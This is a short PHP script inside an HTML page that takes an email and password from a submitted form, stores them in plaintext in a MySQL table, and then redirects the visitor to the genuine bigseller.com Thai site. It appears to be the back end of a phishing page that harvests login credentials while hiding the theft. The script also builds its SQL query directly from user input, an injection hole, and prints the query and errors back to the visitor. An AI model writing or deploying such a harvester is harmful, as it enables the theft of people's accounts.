<!DOCTYPE html>
<html>
<head>
	<title>DATA</title>
</head>
<body>

<?php

$EMAIL=$_POST['email'];
$PASSWORD=$_POST['pass'];

$link = mysqli_connect("localhost", "root", "", "test");

if($link === false){
	die("ERROR: Could not connect.".mysqli_connect_error());
}

$sql = "INSERT INTO data (username, password) VALUES ('$EMAIL', '$PASSWORD')";

if(mysqli_query($link, $sql)){
	header("Location:https://www.bigseller.com/th/index.htm");
	exit();
} else{
	echo "ERROR: COuld not be able to execute $sql.".mysqli_error($link);
}

mysql_close($link);

 ?>

</body>
</html>
